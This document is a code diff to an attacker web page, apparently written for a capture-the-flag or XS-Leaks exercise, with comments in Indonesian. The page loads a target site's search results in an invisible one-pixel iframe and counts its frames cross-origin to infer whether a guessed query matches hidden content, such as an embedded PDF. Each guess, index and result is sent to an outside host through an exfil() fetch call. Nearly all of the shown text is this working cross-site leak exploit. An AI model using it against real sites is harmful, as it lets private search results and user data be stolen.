@@ -13,29 +13,24 @@ function exfil(data) {
   fetch(url, { mode: 'no-cors' }).catch(() => {});
 }
 
-function getParam(k) {
-  return new URLSearchParams(location.search).get(k) || '';
-}
-
-const guess = getParam('g');
-const idx   = getParam('i');
+const guess = new URLSearchParams(location.search).get('g') || '';
+const idx   = new URLSearchParams(location.search).get('i') || '';
 
 if (!guess) {
   document.body.innerText = 'missing ?g= param';
 } else {
   exfil({ status: 'loading', guess, idx });
 
-  const win = window.open(
-    TARGET + '/search?q=' + encodeURIComponent(guess),
-    '_blank',
-    'width=1,height=1'
-  );
+  const iframe = document.createElement('iframe');
+  iframe.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0;pointer-events:none;';
+  iframe.src = TARGET + '/search?q=' + encodeURIComponent(guess);
 
-  setTimeout(() => {
+  iframe.onload = function() {
+    // window.length bisa dibaca cross-origin!
+    // kalau ada iframe embed PDF di search page → iframe.contentWindow.length = 1
+    // kalau tidak ada → 0
     try {
-      // window.length = jumlah iframe/frame di halaman
-      // kalau PDF di-embed → muncul <iframe> → length > 0
-      const len = win.length;
+      const len = iframe.contentWindow.length;
       exfil({
         status: 'done',
         guess,
@@ -45,10 +40,18 @@ if (!guess) {
       });
     } catch(e) {
       exfil({ status: 'error', guess, idx, err: e.message });
-    } finally {
-      win.close();
     }
-  }, 3000);
+  };
+
+  iframe.onerror = function() {
+    exfil({ status: 'iframe_error', guess, idx });
+  };
+
+  document.body.appendChild(iframe);
+
+  setTimeout(() => {
+    exfil({ status: 'timeout', guess, idx });
+  }, 8000);
 }
 </script>
 </body>
